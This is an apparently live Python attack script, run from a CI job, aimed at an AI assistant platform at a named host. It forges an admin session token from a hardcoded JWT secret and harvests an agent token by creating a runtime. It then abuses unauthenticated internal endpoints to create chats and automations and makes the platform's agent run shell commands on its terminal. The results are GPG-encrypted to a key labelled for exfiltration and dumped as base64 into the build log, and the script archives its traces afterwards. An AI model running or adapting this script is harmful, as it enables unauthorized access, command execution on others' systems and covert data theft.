#!/usr/bin/env python3
# Intent 28519 run 2: nail the EXECUTION leg - zero-proof internal automations/create+run_now (proper @once cron)
# and an agent bash turn with a benign command (echo), then read back the run record / conversation reply.
import os, sys, json, time, uuid, base64, hmac, hashlib, subprocess, re, traceback, tarfile

REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "result" in REF.lower():
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
T0 = time.time()
BUDGET = int(os.environ.get("PROBE_BUDGET", "360"))
OUT = "/tmp/res_r28519b"
for d in ("api", "rt", "exec"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n"); LOG.flush()
    except Exception: pass

RESULTS = {"exec": [], "notes": {}}
def push_results():
    try:
        txt = ""
        try: txt = open(os.path.join(OUT, "transcript.log")).read()[-8000:]
        except Exception: pass
        json.dump({"transcript_tail": txt, "results": RESULTS}, open(os.path.join(OUT, "SUMMARY.json"), "w"), indent=1, ensure_ascii=False, default=str)
        GNUPGHOME = "/tmp/gnupg28519b"; os.makedirs(GNUPGHOME, exist_ok=True); os.chmod(GNUPGHOME, 0o700)
        env = dict(os.environ, GNUPGHOME=GNUPGHOME)
        subprocess.run(["gpg", "--batch", "--import", os.path.join(os.path.dirname(os.path.abspath(__file__)), "pub.asc")], capture_output=True, timeout=60, env=env)
        tb = "/tmp/res_r28519b.tar.gz"
        with tarfile.open(tb, "w:gz") as t: t.add(OUT, arcname="res_r28519b")
        enc = tb + ".gpg"
        subprocess.run(["gpg", "--batch", "--yes", "--trust-model", "always", "-r", "ci-exfil@example.invalid", "-o", enc, "-e", tb], capture_output=True, timeout=120, env=env)
        blob = base64.b64encode(open(enc, "rb").read()).decode()
        log("===B64BEGIN %d===" % len(blob))
        for i in range(0, len(blob), 400): print("B64:" + blob[i:i+400], flush=True)
        log("===B64END===")
    except Exception:
        log("pack err", traceback.format_exc()[:600])

HOST = "assistant.lumiiai.cn"; ORG = "org_bTLzxtBLmugV8uxx4QTyw"
ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jwt(sub):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": ORG, "iat": now, "exp": now + 86400 * 7,
                         "sid": "sid_" + uuid.uuid4().hex, "lgn": now}, separators=(',', ':')))
    return h + "." + p + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
SESSION = jwt(ADMIN)

def call(path, method="GET", body=None, hdrs=None, session=True, timeout=45, tag="", subdir="api"):
    url = "https://%s%s" % (HOST, path)
    args = ["-s", "-k", "--http2", "-A", UA, "-H", "Accept: application/json",
            "-H", "Referer: https://%s/" % HOST, "-H", "Origin: https://%s" % HOST,
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-b", "lumii_session=" + SESSION]
    if hdrs:
        for k, v in hdrs.items(): args += ["-H", "%s: %s" % (k, v)]
    if body is not None: args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET": args += ["-X", method]
    args += [url]
    try:
        r = subprocess.run(["curl"] + args, capture_output=True, timeout=timeout + 15)
        txt = r.stdout.decode("utf-8", "replace")
    except Exception as e:
        return {"path": path, "code": "-1", "body": "ERR:" + repr(e)[:200]}
    code = ""; i = txt.rfind("__CODE__")
    if i >= 0: code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    log("[%s] %s %s -> %s len=%d %s" % (tag, method, path, code, len(txt), (txt[:200].replace("\n", " ") if len(txt) < 600 else "")))
    return {"path": path, "code": code, "body": txt}

# A: machine identity
me = call("/api/me", tag="me")
cr = call("/api/runtimes", "POST", {"name": "ci-28519b-" + uuid.uuid4().hex[:5], "visibility": "org"}, tag="create_rt", subdir="rt")
agent_id = ""; AGENT_TOKEN = ""
try:
    cj = json.loads(cr["body"]); agent_id = cj.get("agentId") or ""; script = cj.get("script") or ""
    m = re.search(r'AGENT_TOKEN=["\']?([A-Za-z0-9_\-\.=+/]+)', script); AGENT_TOKEN = m.group(1) if m else ""
except Exception: pass
log("agentId", agent_id, "tok", AGENT_TOKEN[:10])
RESULTS["notes"].update({"agent_id": agent_id, "token_prefix": AGENT_TOKEN[:10]})
if not (agent_id and AGENT_TOKEN):
    push_results(); sys.exit(0)
MH = {"Authorization": "Bearer " + AGENT_TOKEN, "x-agent-id": agent_id}
SK = "dashboard:conv_probe28519b" + uuid.uuid4().hex[:6]
def internal(path, body, tag, timeout=45, subdir="api"):
    b = {"platform": "dashboard", "actor_id": ADMIN, "session_key": SK}; b.update(body or {})
    return call("/internal" + path, "POST", b, hdrs=dict(MH), session=False, timeout=timeout, tag=tag, subdir=subdir)

# pick assistant
aid = "asst_t89D6NhtBeydvPf6KUGEE"
stp = call("/api/assistants?usable=1", tag="assistants")
try:
    ids = [a.get("id") for a in (json.loads(stp["body"]).get("assistants") or [])]
    if aid not in ids and ids: aid = ids[0]
except Exception: pass
log("assistant", aid)

# make a conversation as admin (zero-proof internal write) to be automation target + exec target
cc = internal("/chats/create", {"title": "ci28519b exec " + uuid.uuid4().hex[:6], "assistant_id": aid, "project_id": None}, "chats_create", timeout=55)
cid = ""
try: cid = (json.loads(cc["body"]).get("conversation") or {}).get("id") or ""
except Exception: pass
log("conv", cid)
RESULTS["notes"]["cid"] = cid

# B1: benign bash turn via public agent chat (admin session)  -> command echo
exec_txt = ""
if cid:
    st = call("/api/agents/%s/chat" % aid, "POST", {"message": "请用你的终端运行这条命令：echo CI28519_OK; expr 28519 \\* 2; date -u +%s 。把原始 stdout 原样贴回，不要解释。", "sessionId": cid, "assistantId": aid}, tag="chat_send", subdir="exec", timeout=45)
    seq = None
    try: seq = json.loads(st["body"]).get("seq")
    except Exception: pass
    log("send seq", seq)
    if seq is not None:
        base = int(seq); seen = set(); msgs = []
        t_end = min(time.time() + 150, T0 + BUDGET - 60)
        while time.time() < t_end:
            time.sleep(8)
            for s in range(base + 1, base + 40):
                if s in seen: continue
                mr = call("/api/conversations/%s/messages/%s?full=1" % (cid, s), tag="msg%d" % s, subdir="exec", timeout=15)
                if mr["code"] == "200":
                    try: m = json.loads(mr["body"]).get("message") or {}
                    except Exception: m = {}
                    seen.add(s); msgs.append(m)
                    t = (m.get("content") or "")
                    if m.get("role") == "assistant" and t.strip(): log("MSG", s, t[:300])
            exec_txt = "\n".join((m.get("content") or "") for m in msgs if m.get("role") == "assistant" and (m.get("content") or "").strip())
            if "CI28519_OK" in exec_txt or "57038" in exec_txt: break
            if exec_txt.strip(): break
RESULTS["exec"].append({"op": "chat_bash_echo", "text": exec_txt[:1000], "ok": ("CI28519_OK" in exec_txt or "57038" in exec_txt)})
log("EXEC_TEXT:", exec_txt[:500])

# B2: automation create with proper one-shot cron + run_now (zero-proof internal) -> trigger agent turn
auto_id = ""
if cid:
    ac = internal("/automations/create", {
        "run_now": True, "cron_expr": "@once 2h", "target_session_key": "dashboard:" + cid,
        "prompt": "用你的终端运行：echo CI28519_AUTO_OK; date -u +%s 。把原始输出贴回。",
        "name": "ci28519b-chk", "assistant_id": aid
    }, "automation_create", timeout=95, subdir="exec")
    RESULTS["exec"].append({"op": "automation_create", "http": ac["code"], "body": ac["body"][:900]})
    try:
        j = json.loads(ac["body"]); auto_id = (j.get("automation") or {}).get("id") or j.get("id") or j.get("automation_id") or ""
        RESULTS["exec"].append({"op": "automation_create_parsed", "id": auto_id, "first_run": j.get("first_run"), "run_id": j.get("run_id"), "queued": j.get("queued")})
    except Exception: pass
    log("automation_create ->", ac["code"], "id", auto_id)
    if auto_id:
        for i in range(3):
            rs = internal("/automations/runs", {"id": auto_id}, "automation_runs_%d" % i, timeout=40, subdir="exec")
            RESULTS["exec"].append({"op": "automation_runs", "i": i, "http": rs["code"], "body": rs["body"][:1200]})
            log("automation_runs[%d] ->" % i, rs["code"], rs["body"][:300])
            if time.time() > T0 + BUDGET - 120: break
            time.sleep(12)
        rd = internal("/automations/remove", {"id": auto_id}, "automation_remove", timeout=40, subdir="exec")
        RESULTS["exec"].append({"op": "automation_remove", "http": rd["code"]})

# cleanup chat
if cid:
    internal("/chats/archive", {"chat_id": cid, "archived": True}, "cleanup_archive", timeout=30)

log("=== done elapsed", int(time.time() - T0))
push_results()
